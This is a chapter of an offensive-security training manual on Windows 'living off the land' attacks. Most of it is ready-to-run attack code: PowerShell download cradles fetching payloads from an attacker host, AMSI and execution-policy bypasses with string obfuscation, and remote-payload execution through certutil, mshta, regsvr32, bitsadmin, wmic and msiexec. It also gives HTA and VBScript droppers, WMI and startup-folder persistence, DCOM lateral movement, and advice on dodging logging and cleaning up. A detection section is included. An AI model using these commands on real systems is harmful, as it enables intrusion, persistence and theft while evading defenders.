# Chapter 19 — Living Off The Land: The Enemy's Tools Are Your Tools

**VADER-RCE Field Manual**
**Prerequisite**: Chapters 01-08 (memory corruption fundamentals), Chapter 08 (AMSI from vader-rootkit)
**Drill**: DRILLS/19_lotl_ops/

---

## The LotL Philosophy

Here's the single most important lesson in offensive operations: the best
attack leaves ZERO new files on disk.

Every EDR, every antivirus, every SOC analyst — they're all watching for
anomalies. New binary appears on disk? Flagged. Unknown process spawns?
Flagged. Executable downloaded to temp folder? Flagged. You trip every wire
they've set because you brought your own tools to the fight.

But what if you didn't bring anything?

Every Windows machine ships with hundreds of signed Microsoft binaries.
PowerShell. certutil. mshta. rundll32. bitsadmin. wmic. These are LEGITIMATE
system administration tools. They're signed by Microsoft. They're expected
to run. They're whitelisted by default.

When you use them offensively, you're:
- **No file drops** — nothing new on disk for AV to scan
- **No signatures** — you're running Microsoft-signed binaries
- **No anomalous processes** — certutil runs on every corporate machine daily
- **Blending with noise** — your traffic looks like sysadmin activity

This is Living Off The Land. You don't smuggle weapons past the checkpoint.
You walk in unarmed and pick up the guard's rifle.

### The Operational Mindset

Think of it this way. You've compromised a workstation. You need to:
1. Download a second-stage payload
2. Execute it in memory
3. Establish persistence
4. Move laterally to the next target

The amateur writes a custom dropper, compiles it, transfers it, runs it.
That's four file-on-disk events. Four chances to get caught.

The operator does all four steps with tools already installed on the box.
Zero file events. Zero new processes that weren't already expected.

```
# Amateur approach — loud as fuck
# Transfer custom binary via SMB, execute it
copy \\attacker\share\payload.exe C:\temp\payload.exe
C:\temp\payload.exe

# LotL approach — silent
# Download with certutil, execute with rundll32, persist with schtasks
certutil -urlcache -split -f http://192.168.1.50/payload.dll C:\Windows\Temp\update.dll
rundll32.exe C:\Windows\Temp\update.dll,DllMain
schtasks /create /tn "WindowsUpdate" /tr "rundll32.exe C:\Windows\Temp\update.dll,DllMain" /sc daily /st 09:00
```

Even the LotL example above is sloppy — it still drops a file. The real
operators go fileless entirely. We'll get there.

---

## PowerShell Offensive Operations

PowerShell is the single most powerful tool on a Windows box. It has
direct access to .NET, COM objects, WMI, the Windows API, the registry,
Active Directory, and the network stack. It's a full programming language
disguised as a shell. And it's on every Windows machine since Windows 7.

### Execution Policy — The Paper Lock

Execution policy is NOT a security boundary. Microsoft says this explicitly
in their own documentation. It's a safety feature to prevent accidental
script execution. It stops users, not attackers.

```powershell
# Check current policy
Get-ExecutionPolicy
# Probably "Restricted" on workstations

# Bypass methods — pick your favourite:

# 1. -ExecutionPolicy Bypass flag
powershell.exe -ExecutionPolicy Bypass -File evil.ps1

# 2. Shorthand
powershell.exe -ep bypass -file evil.ps1

# 3. Pipe the script content (no file needed)
Get-Content evil.ps1 | powershell.exe -noprofile -

# 4. Download and execute in memory — no file on disk at all
powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/evil.ps1')"

# 5. Encode the whole command in Base64 (avoids quote escaping, looks like garbage to casual inspection)
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/evil.ps1')"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# 6. Via cmd.exe (evades some PowerShell-specific detections)
cmd.exe /c "echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/evil.ps1') | powershell -nop -"
```

### Download Cradles

A "download cradle" is a one-liner that downloads and executes code in
memory. No file touches disk. These are the bread and butter of initial
access and payload delivery.

```powershell
# Classic — Net.WebClient
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')

# Invoke-WebRequest (PS 3.0+)
IEX(Invoke-WebRequest -Uri 'http://192.168.1.50/payload.ps1' -UseBasicParsing).Content

# .NET HttpClient (PS 5.0+ / .NET 4.5+)
$client = [System.Net.Http.HttpClient]::new()
IEX($client.GetStringAsync('http://192.168.1.50/payload.ps1').Result)

# COM object — uses Internet Explorer engine, follows proxy settings
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate('http://192.168.1.50/payload.ps1')
while($ie.Busy){Start-Sleep -Milliseconds 100}
IEX($ie.Document.body.innerText)
$ie.Quit()

# System.Xml.XmlDocument — download XML with embedded script
$xml = New-Object System.Xml.XmlDocument
$xml.Load('http://192.168.1.50/config.xml')
IEX($xml.SelectSingleNode('//command').InnerText)
```

The key in every cradle: `IEX` (Invoke-Expression). It takes a string
and executes it as PowerShell code. The string came from the network.
Nothing was written to disk.

### PowerShell Without powershell.exe

EDR loves to monitor powershell.exe. If it spawns, alarms go off.
Solution: don't use powershell.exe. Use the PowerShell ENGINE directly.

PowerShell is actually the `System.Management.Automation` DLL. The
powershell.exe binary is just a host process that loads it. Any .NET
process can load the same DLL and get full PowerShell capability.

```csharp
// C# — load PowerShell engine directly
// Compile as .exe, or inject as shellcode
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
ps.AddScript("Get-Process | Where-Object {$_.CPU -gt 100}");
var results = ps.Invoke();
// Full PowerShell — no powershell.exe process
```

You can also use existing .NET hosts:
- **MSBuild.exe** — compiles and executes inline C# tasks
- **InstallUtil.exe** — runs code in installer classes
- **csc.exe** — C# compiler, compile and run on the fly

```xml
<!-- MSBuild inline task — executes C# code that loads PowerShell engine -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="PSExec">
    <PSTask />
  </Target>
  <UsingTask TaskName="PSTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System.Management.Automation;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class PSTask : Task {
            public override bool Execute() {
                PowerShell.Create().AddScript("whoami").Invoke();
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Run it: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe task.csproj`

MSBuild is a signed Microsoft developer tool. Not powershell.exe.
Your PowerShell code runs inside MSBuild's process space.

### AMSI — The Inspection Checkpoint

AMSI (Antimalware Scan Interface) is Microsoft's content-inspection API.
When PowerShell executes a script, BEFORE execution it sends the script
content to AMSI, which forwards it to the registered AV engine (usually
Defender). If the content matches a known signature — blocked.

This is why `Invoke-Mimikatz` gets caught even when downloaded to memory.
The string "Invoke-Mimikatz" itself is flagged. Doesn't matter if it's
on disk or in memory — AMSI sees the content.

You covered HWBP-based AMSI bypass in Chapter 08 of vader-rootkit. The
principle: set a hardware breakpoint on `AmsiScanBuffer`, force it to
return "AMSI_RESULT_CLEAN" for every scan. No patching, no memory writes
that trigger integrity checks.

Other documented AMSI context:

```powershell
# Reflection-based — modify the AMSI result field in memory
# This specific pattern is now signatured — it's here for understanding, not operational use
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# String obfuscation to evade static signatures
$a = 'Ams'+'iUt'+'ils'
$b = 'am'+'si'+'In'+'it'+'Fa'+'il'+'ed'
[Ref].Assembly.GetType("System.Management.Automation.$a").GetField($b,'NonPublic,Static').SetValue($null,$true)
```

The cat-and-mouse game: Microsoft signatures the bypass, researchers find
new ones, Microsoft patches those, repeat. The HWBP approach from Ch 08
is more durable because it operates at the CPU level, not the .NET level.

### Constrained Language Mode

CLM restricts PowerShell to a subset — no .NET types, no COM objects,
no Add-Type. It's applied via AppLocker or WDAC policies. It neuters
most offensive PowerShell.

Detection and bypass context:

```powershell
# Check your language mode
$ExecutionContext.SessionState.LanguageMode
# "FullLanguage" = unrestricted
# "ConstrainedLanguage" = restricted

# CLM applies per-session. If you can get a FullLanguage session, you win.
# PowerShell v2 (if installed) ignores CLM — it predates the feature:
powershell.exe -Version 2 -ep bypass -file evil.ps1
# Check if v2 engine is installed:
# Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# Custom runspaces created via .NET bypass CLM — they get FullLanguage by default
# (same MSBuild/InstallUtil technique from above)
```

---

## The LOLBAS Catalogue

LOLBAS — Living Off The Land Binaries And Scripts. The community maintains
a catalogue at lolbas-project.github.io. Hundreds of signed Microsoft
binaries with offensive potential. Here are the heavy hitters.

### certutil.exe

**What it is**: Certificate utility. Manages certificates, CRLs, and CTLs.
Ships with every Windows installation since XP.

**Offensive uses**:

```cmd
:: Download a file (URL cache mode)
certutil.exe -urlcache -split -f http://192.168.1.50/payload.exe C:\Windows\Temp\update.exe

:: Download and decode in one shot (Base64 encoded payload avoids content inspection)
:: Attacker encodes payload: certutil -encode payload.exe payload.b64
:: Victim decodes:
certutil.exe -decode payload.b64 payload.exe

:: Calculate file hash (recon — verify payload integrity)
certutil.exe -hashfile C:\Windows\Temp\update.exe SHA256

:: Encode arbitrary file to Base64 (data exfiltration prep)
certutil.exe -encode sensitive.docx exfil.b64
:: Then exfiltrate the text file — fits in DNS queries, HTTP params, etc.
```

**Detection**: Process `certutil.exe` with `-urlcache` or `-decode` in command
line. Sysmon Event ID 1 (process creation). Network connections from
certutil are suspicious in most environments.

### mshta.exe

**What it is**: Microsoft HTML Application Host. Runs .hta files — HTML with
embedded VBScript/JScript that runs with full trust (no browser sandbox).

**Offensive uses**:

```cmd
:: Execute a remote HTA file
mshta.exe http://192.168.1.50/payload.hta

:: Inline JScript execution (no file needed)
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"":close")

:: JScript variant
mshta.exe javascript:a=GetObject("script:http://192.168.1.50/payload.sct");close();
```

**Detection**: mshta.exe making network connections. mshta.exe spawning
child processes (cmd.exe, powershell.exe). Unusual for mshta to run
outside of enterprise apps that use HTA.

### rundll32.exe

**What it is**: Runs DLL functions. Normally used to execute code in DLL
files by calling a specific exported function.

**Offensive uses**:

```cmd
:: Execute a DLL's exported function
rundll32.exe payload.dll,DllMain

:: Execute JavaScript via url.dll
rundll32.exe url.dll,OpenURL http://192.168.1.50/payload.hta

:: Execute JavaScript via mshtml
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("<script>new ActiveXObject('WScript.Shell').Run('calc')</script>")

:: Load remote SCT file via scrobj.dll (Squiblydoo variant)
rundll32.exe scrobj.dll,GenerateTypeLib "http://192.168.1.50/payload.sct"
```

**Detection**: rundll32.exe with command-line arguments containing URLs,
javascript:, or uncommon DLL names. rundll32 spawning cmd.exe or
powershell.exe.

### regsvr32.exe — Squiblydoo

**What it is**: COM server registration utility. Registers and unregisters
OLE controls including DLLs and ActiveX controls.

**Offensive uses**:

```cmd
:: Classic Squiblydoo — load remote SCT (scriptlet) file
:: The SCT file contains JScript/VBScript that executes arbitrary code
regsvr32.exe /s /n /u /i:http://192.168.1.50/payload.sct scrobj.dll

:: /s = silent (no dialog boxes)
:: /n = don't call DllRegisterServer
:: /u = unregister (triggers DllUnregisterServer which processes /i URL)
:: /i:URL = the remote scriptlet to execute
:: scrobj.dll = COM scripting runtime, processes the SCT
```

Sample SCT file:
```xml
<?XML version="1.0"?>
<scriptlet>
  <registration progid="Test" classid="{00000000-0000-0000-0000-000000000000}">
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell");
        r.Run("calc.exe");
      ]]>
    </script>
  </registration>
</scriptlet>
```

**Detection**: regsvr32.exe making outbound network connections. regsvr32
loading scrobj.dll. Command line containing URLs.

### bitsadmin.exe

**What it is**: Background Intelligent Transfer Service admin tool.
Manages file transfers that survive reboots and network interruptions.

**Offensive uses**:

```cmd
:: Download a file
bitsadmin /transfer updatejob /download /priority high http://192.168.1.50/payload.exe C:\Windows\Temp\update.exe

:: Create a persistent download job (survives reboots)
bitsadmin /create persistjob
bitsadmin /addfile persistjob http://192.168.1.50/payload.exe C:\Windows\Temp\update.exe
bitsadmin /setnotifycmdline persistjob cmd.exe "/c C:\Windows\Temp\update.exe"
bitsadmin /resume persistjob

:: The setnotifycmdline runs a command when the download completes
:: Download + execute in one package. Survives reboots.
```

**Detection**: bitsadmin.exe creating transfer jobs to external URLs.
BITS Event Log entries. Sysmon network connections from bitsadmin.

### wmic.exe

**What it is**: Windows Management Instrumentation CLI. Queries and
manages virtually every aspect of a Windows system.

**Offensive uses**:

```cmd
:: Remote process execution (needs admin creds on target)
wmic /node:192.168.1.100 /user:admin /password:pass process call create "cmd.exe /c whoami > C:\output.txt"

:: Local recon
wmic os get caption,version,osarchitecture
wmic process list brief
wmic product get name,version
wmic service get name,state,pathname

:: XSL script execution (bypasses application whitelisting)
wmic os get /format:"http://192.168.1.50/payload.xsl"
```

**Detection**: wmic.exe with `/node:` parameter (remote execution).
wmic.exe loading XSL from URLs. Parent-child: unusual parent spawning wmic.

### msiexec.exe

**What it is**: Windows Installer. Installs, modifies, and removes
software distributed as .msi packages.

**Offensive uses**:

```cmd
:: Install remote MSI (downloads and executes)
msiexec /q /i http://192.168.1.50/payload.msi

:: /q = quiet (no UI)
:: /i = install
:: The MSI contains your payload as a custom action
```

**Detection**: msiexec.exe connecting to external URLs. MSI installation
from non-standard sources. Custom actions spawning unexpected processes.

---

## WMI As A Weapon

Windows Management Instrumentation. The management backbone of every
Windows network. Every sysadmin uses it. Every domain controller depends
on it. And it's one of the most powerful offensive tools you have.

### WMI Architecture

WMI is a database. The CIM (Common Information Model) repository stores
"classes" that represent every manageable component of the system:
processes, services, hardware, software, network config, event logs.

You query it like SQL:
```
SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'
```

WMI operates over DCOM (port 135 + dynamic RPC ports). It's expected
traffic on enterprise networks. Firewalls allow it. SOC analysts expect it.

### WMI Reconnaissance

```powershell
# OS information
Get-WmiObject Win32_OperatingSystem | Select Caption, Version, OSArchitecture, LastBootUpTime

# All installed software
Get-WmiObject Win32_Product | Select Name, Version

# All running processes
Get-WmiObject Win32_Process | Select ProcessId, Name, CommandLine

# Logged-in users
Get-WmiObject Win32_LoggedOnUser

# Network configuration
Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.IPAddress} | Select Description, IPAddress, DefaultIPGateway, DNSServerSearchOrder

# Shares
Get-WmiObject Win32_Share

# Startup programs
Get-WmiObject Win32_StartupCommand | Select Name, Command, Location

# AntiVirus products (workstations only — uses SecurityCenter2)
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Select displayName, pathToSignedReportingExe
```

### WMI Remote Code Execution

```powershell
# Remote process creation — the classic
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName TARGET -Credential $cred

# Same thing with wmic
wmic /node:TARGET /user:DOMAIN\admin /password:P@ss process call create "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"

# Modern equivalent using CIM (recommended — WMI is deprecated in new PS)
$session = New-CimSession -ComputerName TARGET -Credential $cred
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"} -CimSession $session
```

### WMI Event Subscriptions — Persistence

This is the real power. WMI can watch for events and trigger actions.
Set it once. It runs forever. Survives reboots. Lives in the WMI
repository, not the filesystem.

```powershell
# Three components needed:
# 1. Event Filter — WHAT triggers the action
# 2. Event Consumer — WHAT action to take
# 3. Binding — connects filter to consumer

# Example: run payload every time a user logs in

# Filter — trigger on user logon
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WindowsUpdate"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# Consumer — what to execute
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WindowsUpdate"
    CommandLineTemplate = "cmd.exe /c powershell -ep bypass -file C:\Windows\Temp\update.ps1"
}

# Binding — connect them
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Detection**: Query for permanent WMI subscriptions:
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

If you see subscriptions you don't recognise — someone's been there.

### wmic vs Get-WmiObject vs Get-CimInstance

| Feature | wmic.exe | Get-WmiObject | Get-CimInstance |
|---------|----------|---------------|-----------------|
| Interface | CMD | PowerShell | PowerShell |
| Protocol | DCOM | DCOM | WinRM (default) |
| Status | Deprecated (Win 11) | Legacy | Current/recommended |
| Remote support | Yes (DCOM) | Yes (DCOM) | Yes (WinRM) |
| Firewall friendliness | Needs RPC ports | Needs RPC ports | Port 5985/5986 only |
| Detection profile | High (deprecated) | Medium | Low (standard admin tool) |

**Operational note**: Use `Get-CimInstance` / `Invoke-CimMethod` for modern
targets. WinRM traffic on port 5985 is expected in managed environments.
wmic.exe is deprecated and its use is increasingly flagged.

---

## Windows Scripting

### cscript / wscript

Two hosts for the Windows Script Host (WSH) engine:
- **cscript.exe** — console-based, output to terminal
- **wscript.exe** — GUI-based, output to message boxes

Both execute .vbs (VBScript) and .js (JScript) files.

```vbscript
' payload.vbs — download and execute
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", "http://192.168.1.50/payload.exe", False
objHTTP.Send

Set objStream = CreateObject("ADODB.Stream")
objStream.Open
objStream.Type = 1
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile "C:\Windows\Temp\update.exe", 2
objStream.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Windows\Temp\update.exe", 0
```

```cmd
:: Execute it
cscript.exe //nologo payload.vbs
:: //nologo suppresses the banner
:: //B runs in batch mode (no interactive dialogs)
```

**Why .js and .vbs still work in 2026**: Enterprise apps depend on them.
Login scripts. Printer mappings. Drive mappings. Legacy automation.
Microsoft can't remove WSH without breaking thousands of organisations.
The attack surface stays open because the legitimate use case won't die.

### HTA Files

HTML Application files. Full HTML + scripting with LOCAL MACHINE zone
privileges. No browser sandbox. Full access to COM objects, filesystem,
network.

```html
<!-- payload.hta -->
<html>
<head>
<script language="VBScript">
Sub RunPayload()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')", 0
    self.close
End Sub
</script>
</head>
<body onload="RunPayload">
<h1>Loading update...</h1>
</body>
</html>
```

Delivery: email attachment, hosted on web server and opened with
`mshta.exe http://...`, USB drop. The user sees an HTML page.
The code runs in the background.

---

## Built-In Transfer Methods

You need to move files. Payloads in, data out. Every method has a
different detection profile. Know them all.

| Method | Command | Detection Profile |
|--------|---------|-------------------|
| certutil | `certutil -urlcache -split -f <URL> <FILE>` | HIGH — heavily signatured |
| bitsadmin | `bitsadmin /transfer j /download /priority high <URL> <FILE>` | MEDIUM — BITS event logging |
| PowerShell IWR | `Invoke-WebRequest -Uri <URL> -OutFile <FILE>` | MEDIUM — PowerShell script logging |
| PowerShell WebClient | `(New-Object Net.WebClient).DownloadFile('<URL>','<FILE>')` | MEDIUM — less logged than IWR |
| Start-BitsTransfer | `Start-BitsTransfer -Source <URL> -Destination <FILE>` | MEDIUM — PowerShell + BITS combined |
| .NET WebClient | `[System.Net.WebClient]::new().DownloadFile('<URL>','<FILE>')` | LOW — .NET method call |
| curl.exe | `curl.exe -o <FILE> <URL>` | LOW — ships with Win10+, common usage |
| Expand-Archive | Downloads ZIP directly via .NET then extracts | LOW |

### In-Memory Only (No File On Disk)

```powershell
# Download string and execute — nothing written
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/script.ps1')

# Download bytes into variable — use in memory
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.50/payload.bin')

# Reflective assembly load — .NET assembly runs entirely in memory
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.50/sharp.exe')
[System.Reflection.Assembly]::Load($bytes)
[SharpTool.Program]::Main(@("argument1","argument2"))
```

The reflective assembly load is the gold standard. A compiled C# tool
loads into the current PowerShell process. No new process. No file on
disk. Runs entirely in memory. When the process exits, it's gone.

---

## COM Object Abuse

Component Object Model. Microsoft's component architecture from the
1990s. Still deeply embedded in Windows. COM objects provide programmatic
access to system functionality — and attackers use them for things
Microsoft never intended.

### InternetExplorer.Application — Stealthy Web Requests

```powershell
# Create a hidden IE instance for web requests
# Why? IE COM object uses the system proxy settings automatically
# and its traffic blends with normal IE/Edge traffic
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate("http://192.168.1.50/beacon")
while($ie.Busy -or $ie.ReadyState -ne 4) { Start-Sleep -Milliseconds 100 }
$response = $ie.Document.body.innerText
$ie.Quit()
# $response now contains C2 instructions — fetched through IE's traffic profile
```

### Shell.Application — File Operations

```powershell
# Interact with the filesystem via COM
$shell = New-Object -ComObject Shell.Application
# Extract a ZIP (no Expand-Archive needed)
$shell.Namespace("C:\Dest").CopyHere($shell.Namespace("C:\payload.zip").Items())
```

### WScript.Shell — Command Execution

```powershell
# Execute commands via WSH COM object instead of cmd.exe or powershell.exe
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("cmd.exe /c whoami > C:\output.txt", 0, $true)
# 0 = hidden window, $true = wait for completion

# Read registry
$val = $wsh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")

# Create a shortcut (persistence via startup folder)
$lnk = $wsh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-ep bypass -w hidden -f C:\Windows\Temp\update.ps1"
$lnk.WindowStyle = 7  # minimized
$lnk.Save()
```

### MMC20.Application — Lateral Movement via DCOM

This is the big one. DCOM (Distributed COM) lets you instantiate COM
objects on REMOTE machines. MMC20.Application has an `ExecuteShellCommand`
method. Remote code execution via a legitimate management interface.

```powershell
# Requires admin rights on the target
$dcom = [System.Activator]::CreateInstance(
    [Type]::GetTypeFromProgID("MMC20.Application", "192.168.1.100")
)
$dcom.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",           # executable
    $null,               # directory
    "/c whoami > C:\output.txt",  # parameters
    "7"                  # window state (minimized)
)
```

Other DCOM objects for lateral movement:
- **ShellWindows** — `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}`
- **ShellBrowserWindow** — `{C08AFD90-F2A1-11D1-8455-00A0C91F3880}`
- **Excel.Application** — `DDEInitiate` for command execution
- **Outlook.Application** — create and send emails programmatically

**Detection**: DCOM traffic on unusual ports. Source process spawning
processes on remote machine via DCOM. Event ID 4688 on target showing
mmc.exe or dllhost.exe spawning cmd.exe.

---

## Detection and Defense — Thinking Like Blue Team

You need to understand detection as well as you understand the attack.
Not just to evade — to know when YOU'VE been caught, and to defend
your own infrastructure.

### Parent-Child Process Relationships

This is the #1 detection vector for LotL abuse. Normal operations create
predictable process trees:

```
Expected:
  explorer.exe → cmd.exe → ipconfig.exe      (user opens cmd, runs ipconfig)
  svchost.exe → msiexec.exe                  (Windows Update installing)
  winword.exe → splwow64.exe                 (Word printing)

Suspicious:
  winword.exe → cmd.exe → powershell.exe     (macro executing PowerShell)
  excel.exe → mshta.exe                      (macro launching HTA)
  outlook.exe → powershell.exe               (email-triggered execution)
  svchost.exe → certutil.exe → cmd.exe       (service downloading + executing)
  wscript.exe → powershell.exe               (VBS script launching PowerShell)
```

If Word spawns PowerShell — that's a compromise. Normal users don't
need PowerShell from inside a Word document. EDRs flag these anomalous
parent-child relationships.

### Command-Line Logging (Event ID 4688)

Process creation events. When enabled (Group Policy → Audit Process
Creation + include command line), every process start logs its full
command line.

```
Event ID: 4688
Creator Process Name: C:\Windows\System32\cmd.exe
New Process Name: C:\Windows\System32\certutil.exe
Process Command Line: certutil.exe -urlcache -split -f http://192.168.1.50/payload.exe
```

SOC analysts write detection rules against these:
- certutil with `-urlcache` or `-decode`
- powershell with `-EncodedCommand` or `-ep bypass`
- mshta making network connections
- regsvr32 loading scrobj.dll
- wmic with `/node:` (remote execution)

### PowerShell Logging

Three types, increasingly invasive:

**Module Logging** (Event ID 4103) — logs PowerShell module/pipeline execution:
```
CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://192.168.1.50/payload.ps1"
```

**Script Block Logging** (Event ID 4104) — logs the FULL script content:
```
Creating Scriptblock text (1 of 1):
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/evil.ps1')
```

Even if you obfuscate the command line, script block logging captures the
DEOBFUSCATED code at execution time. Base64 encoding won't save you.

**Transcription Logging** — writes every PowerShell session to a text file.
Input, output, everything. The complete record.

### Sysmon — The Operator's Nightmare

Sysmon (System Monitor) is a Microsoft Sysinternals tool. When installed,
it generates detailed event logs for:
- Process creation with full command line and hashes (Event ID 1)
- Network connections with source/dest/port (Event ID 3)
- File creation timestamp changes (Event ID 2)
- Driver loads (Event ID 6)
- Image loads / DLL loads (Event ID 7)
- CreateRemoteThread (Event ID 8)
- Raw disk access (Event ID 9)
- Process access / handle manipulation (Event ID 10)
- DNS queries (Event ID 22)
- Named pipe events (Event IDs 17/18)

Sysmon with a good configuration makes LotL significantly harder.
Every technique in this chapter generates Sysmon events. The question
is whether the SOC has rules written for them.

### ETW — Event Tracing for Windows

The deepest telemetry layer. ETW providers generate events for virtually
every subsystem. .NET CLR provider logs assembly loads (catches reflective
loading). AMSI provider logs scan results. WMI provider logs WMI queries.

EDR products hook into ETW for their detection capability. When they say
"behavioral detection" — they often mean ETW event correlation.

### Operational Takeaways For The Attacker

1. **Know what's logging.** Before you execute, check if Sysmon is
   installed, what PowerShell logging is enabled, whether command-line
   logging is active. Recon the defences before you attack through them.

2. **Process lineage matters as much as the command.** Running certutil
   from cmd.exe is less suspicious than running it from Word. Control
   your parent process.

3. **In-memory execution still generates events.** Script block logging
   captures deobfuscated code. .NET ETW logs assembly loads. AMSI scans
   content. "Fileless" doesn't mean "eventless."

4. **Time your operations.** Run during business hours when legitimate
   admin activity provides cover. A certutil download at 3 AM is more
   suspicious than one at 2 PM during a patch window.

5. **Clean up.** Clear your command history. Remove downloaded files.
   Kill persistence mechanisms when you're done. Opsec doesn't end at
   execution.

---

## Summary — Key Takeaways

- **Living Off The Land means using pre-installed, Microsoft-signed tools
  for offensive operations.** No custom malware. No file drops. No new
  binaries to trigger AV.

- **PowerShell is the most powerful LotL tool.** Direct access to .NET,
  COM, WMI, and the Windows API. Execution policy is not a security
  control. AMSI is the real gatekeeper — know how to work around it.

- **You don't need powershell.exe to use PowerShell.** The engine is a
  DLL. Load it from MSBuild, InstallUtil, or any .NET process to avoid
  process-name detection.

- **The LOLBAS catalogue is your shopping list.** certutil for downloads.
  mshta for HTA execution. rundll32 for DLL functions. regsvr32 for
  Squiblydoo. bitsadmin for persistent transfers. wmic for remote
  execution. msiexec for MSI payloads.

- **WMI event subscriptions are fileless persistence.** They live in the
  WMI repository, survive reboots, and trigger on system events. Hard
  to find, hard to remove.

- **COM objects give you capabilities without spawning new processes.**
  InternetExplorer for web requests. WScript.Shell for commands.
  MMC20.Application over DCOM for lateral movement.

- **Detection focuses on parent-child relationships, command-line content,
  and script block logging.** Every technique in this chapter generates
  detectable events. Knowing the detection signature is as important as
  knowing the technique.

- **Fileless is not eventless.** In-memory execution still generates ETW
  events, AMSI scans, and PowerShell logs. The absence of files makes
  forensics harder, not impossible.

- **Understanding LotL makes you a better defender.** If you know what
  certutil abuse looks like, you can write the detection rule. If you
  know WMI persistence exists, you can audit for it. Offence informs
  defence.

---

## Drill 19 — Living Off The Land Operations

Go to `DRILLS/19_lotl_ops/`. Your mission:

1. Download a payload using THREE different LOLBAS binaries
2. Execute code in memory using a PowerShell download cradle
3. Establish persistence using a WMI event subscription
4. Perform lateral movement using DCOM
5. Identify detection artifacts for each step

No custom tools. No malware. Only what Windows gives you.
